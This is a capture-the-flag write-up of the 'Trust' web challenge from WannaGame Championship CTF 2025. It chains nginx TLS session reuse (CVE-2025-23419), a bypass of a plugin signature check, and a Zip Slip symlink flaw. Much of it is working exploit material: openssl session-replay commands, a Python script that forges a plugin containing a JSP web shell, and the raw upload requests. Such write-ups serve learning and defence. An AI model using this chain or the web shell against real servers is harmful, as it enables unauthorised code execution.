# Trust — WannaGame Championship CTF 2025

> **Room / Challenge:** Trust (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** WannaGame Championship CTF 2025
- **Challenge:** Trust (web)
- **Target / URL:** `https://ctf.cnsc.com.vn/games/1/challenges?challenge=20`
- **Points:** `500`
- **Solved:** `61`
- **Date:** `10-12-2025`

---

## Goal

Bypassing the vulnerability chain with 3 main vulnerabilities to get the flag.

## My Solution

This app is vulnerable with a vulnerability chain:

| #   |  Vulnerability   |                       Purpose                       |
| :-- | :--------------: | :-------------------------------------------------: |
| 1   |  CVE-2025-23419  | Bypassing the client certificate of hidden service  |
| 2   | Signature Bypass | Bypass the signature check to upload exploit plugin |
| 3   |     Zip Slip     |            Achieve RCE to read the flag             |

### CVE-2025-23419 SSL Session Reuse

This vulnerability can be easily noticed by the comment in the `nginx.conf`:

```conf
# CVE-2025-23419 vulnerable configuration
# Session cache shared across virtual hosts
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 10m;
ssl_session_tickets on;  # Vulnerable: allows session reuse across vhosts
```

This config allow cache shared through virtual hosts: `ssl_session_cache shared:SSL:10m;`, so by get verified by the `public` service we can also use that state to get access to `employee` service.

Here's is the workflow what we can do:

```
[  THE SERVER (Building)  ]
      ( Shares one list of "Valid Visitors" )
      +-------------------------------------+
      |                                     |
      |   [ GLOBAL "VALID VISITOR" LIST ]   |
      |   (The Lazy Security System)        |
      |                                     |
      +------------------^------------------+
                         |
           (1) GET TICKET|          (3) SHOW TICKET
                 |       |                 |
                 v       |                 v
      +------------------+      +------------------+
      |  PUBLIC DOOR     |      |   VIP DOOR       |
      | (Easy to enter)  |      | (Hard to enter)  |
      +------------------+      +------------------+
              ^                          ^
              | (2) Walk Over            |
      [ YOU ] -------------------------> [ YOU ]
    (Gets Ticket)                     (Uses Ticket)
```

Here is the code I use to get the key, certificate and get verified by the `public` service of nginx:

```bash
# Download the client certificate & key
curl -k -H "Host: public.trustboundary.local" https://challenge.cnsc.com.vn:31507/download/client.crt -o client.crt
curl -k -H "Host: public.trustboundary.local" https://challenge.cnsc.com.vn:31507/download/client.key -o client.key

# Getting verfied by the Public service and get the session.pem
openssl s_client -connect challenge.cnsc.com.vn:31507 \
    -servername public.trustboundary.local \
    -cert client.crt \
    -key client.key \
    -sess_out session.pem
```

Then after get the necessary `session.pem` make a request to the `employee` service:

```bash
echo -e "GET / HTTP/1.1\r\nHost: employee.trustboundary.local\r\n\r\n" | openssl s_client -connect challenge.cnsc.com.vn:31507 -servername employee.trustboundary.local -sess_in session.pem -quiet
```

![Guide image](./screenshots/1.png)
You should see the HTML response that is the response from the Tomcat backend server.

### Signature Bypass

Now we have successfully get access to the Tomcat backend server, decompile the source code we can see in the `PluginUtils.class`:

```java
private static int findSignatureEnd(byte[] data) {
    byte[] marker = "SIG_END".getBytes();
    // Scans from the very end of the file backwards
    for (int i = data.length - marker.length; i >= 0; i--) {
        // ... if found, return position
    }
}
```

The code tries to scanning backwards, and also it uses `ZipFile` class so it can be bypassed with this payload:

```
[---VALID_PLUGIN---] + [---MALICIOUS_ZIP---]
```

We do this because:

- Validator's View: Scans back → Misses the Malicious ZIP (no SIG_END) → Hits SIG_END of the Valid Plugin → "Signature Valid!"
- Extractor's View: Scans back → Hits the EOCD of the Malicious ZIP first → Stops there and extracts it → "Malicious Payload Loaded."

### Zip Slip

Zip Slip allows us to write a file to outside of the targeted directory, the source code do check for this vulnerability however it is still flawed:

```java
// PluginUtils.class
String linkTarget = new String(linkBytes);
Path resolved = file.toPath().getParent().resolve(linkTarget).normalize();

// THE FLAW IS HERE:
if (Files.exists(resolved) &&
    Files.isRegularFile(resolved) && // <--- This line is the fatal error
    !resolved.startsWith(targetDir.toPath()))
{
    throw new IOException("Invalid symlink target: " + entry.getName());
}
```

The developer meant: "If the link points outside the target dir, throw an error." But the if condition requires ALL checks to be true to throw the error.

- We pointed our link to `../../webapps/ROOT`.
- `Files.exists(resolved)` is TRUE (directory exists).
- `Files.isRegularFile(resolved)` is FALSE (it is a directory, not a file).
- Because one condition is false, the entire `if` block is skipped.
- The exception is NOT thrown, and the dangerous symlink is created.

Combining the Signature Bypass and Zip Slip, create the `exploit.plugin` with this code uses `hello-world.plugin` signature:

```python
import zipfile
import os
import sys

VALID_PLUGIN = "hello-world.plugin"  # Must exist in the same folder
OUTPUT_PLUGIN = "exploit.plugin"
SHELL_NAME = "pwn.jsp"

# The JSP Payload
JSP_PAYLOAD = '''
<%@ page import="java.util.*,java.io.*" %>
<%
    try {
        Process p = Runtime.getRuntime().exec("/readflag");
        InputStream i = p.getInputStream();
        Scanner s = new Scanner(i).useDelimiter("\\\\A");
        String output = s.hasNext() ? s.next() : "";
        out.println(output);
    } catch(Exception e) {
        out.println("Error: " + e.getMessage());
    }
%>
'''

def create_malicious_zip(temp_zip_name):
    zip_file = zipfile.ZipFile(temp_zip_name, 'w', zipfile.ZIP_DEFLATED)

    symlink_target = "../../webapps/ROOT"

    info = zipfile.ZipInfo("link")
    info.create_system = 3  # Unix
    info.external_attr = 0xA1ED0000 # Symlink attribute
    zip_file.writestr(info, symlink_target)

    zip_file.writestr("link/" + SHELL_NAME, JSP_PAYLOAD)

    zip_file.close()
    print(f"[+] Malicious ZIP created: {temp_zip_name}")

def combine_plugins():
    if not os.path.exists(VALID_PLUGIN):
        print(f"[-] Error: {VALID_PLUGIN} not found.")
        sys.exit(1)

    with open(VALID_PLUGIN, 'rb') as f:
        valid_data = f.read()

    create_malicious_zip("temp_malicious.zip")

    with open("temp_malicious.zip", 'rb') as f:
        malicious_data = f.read()

    final_data = valid_data + malicious_data

    with open(OUTPUT_PLUGIN, 'wb') as f:
        f.write(final_data)

    print(f"[+] Exploitable plugin generated: {OUTPUT_PLUGIN}")
    print(f"[+] Size: {len(final_data)} bytes")
    os.remove("temp_malicious.zip")

if __name__ == "__main__":
    combine_plugins()
```

Finally upload the `exploit.plugin`:

```bash
BOUNDARY="------------------------boundary123"

echo -e "--$BOUNDARY\r\nContent-Disposition: form-data; name=\"plugin\"; filename=\"exploit.plugin\"\r\nContent-Type: application/octet-stream\r\n\r" > body.bin
cat exploit.plugin >> body.bin
echo -e "\r\n--$BOUNDARY--\r" >> body.bin

LEN=$(wc -c < body.bin)

(
  echo -e "POST /api/plugins/upload HTTP/1.1\r"
  echo -e "Host: employee.trustboundary.local\r"
  echo -e "Content-Type: multipart/form-data; boundary=$BOUNDARY\r"
  echo -e "Content-Length: $LEN\r"
  echo -e "\r"
  cat body.bin
) | openssl s_client -connect challenge.cnsc.com.vn:30420 -servername employee.trustboundary.local -sess_in session.pem -quiet

echo -e "GET /pwn.jsp HTTP/1.1\r\nHost: employee.trustboundary.local\r\n\r\n" | \
openssl s_client -connect challenge.cnsc.com.vn:30420 \
    -servername employee.trustboundary.local \
    -sess_in session.pem \
    -quiet
```

Received:

```json
{
  "message": "Plugin uploaded successfully",
  "success": true,
  "filename": "exploit.plugin"
}
```

Go to `/pwn.jsp` to execute `/readflag` and get the flag:

```bash
echo -e "GET /pwn.jsp HTTP/1.1\r\nHost: employee.trustboundary.local\r\n\r\n" | \
openssl s_client -connect challenge.cnsc.com.vn:31507 \
    -servername employee.trustboundary.local \
    -sess_in session.pem \
    -quiet
```

![Guide image](./screenshots/2.png)
Flag: `W1{c3rTS-m34n-nOth1ng-w1TH0ut-pROp3r_Us4g3_P15-TAk3_1t-1N-m1ND7}`
